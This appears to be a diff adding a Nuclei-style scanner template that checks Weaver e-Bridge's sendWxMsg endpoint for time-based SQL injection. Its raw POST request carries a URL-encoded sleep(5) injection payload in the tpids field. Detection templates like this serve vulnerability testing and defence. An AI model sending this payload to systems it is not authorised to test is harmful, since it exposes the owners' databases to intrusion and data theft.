@@ -1,0 +1,36 @@
+id: weaver-ebridge-sendWxMsg-sqli
+info:
+  name: 泛微云桥 e-Bridge sendWxMsg 存在SQL注入漏洞(VEID-2026-11104) 
+  author: leadlife
+  severity: high
+  description: 泛微云桥 e-Bridge sendWxMsg 存在SQL注入漏洞,攻击者可进行sql注入攻击获取数据库信息或者权限。
+  reference: 
+    - https://mp.weixin.qq.com/s/FZAQ-pFA0kkMvJaF1-B0gg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,weaver,ebridge
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /wxthirdapi/sendWxMsg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%285%29%29x%29+or+%27x%27%3D%27x
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
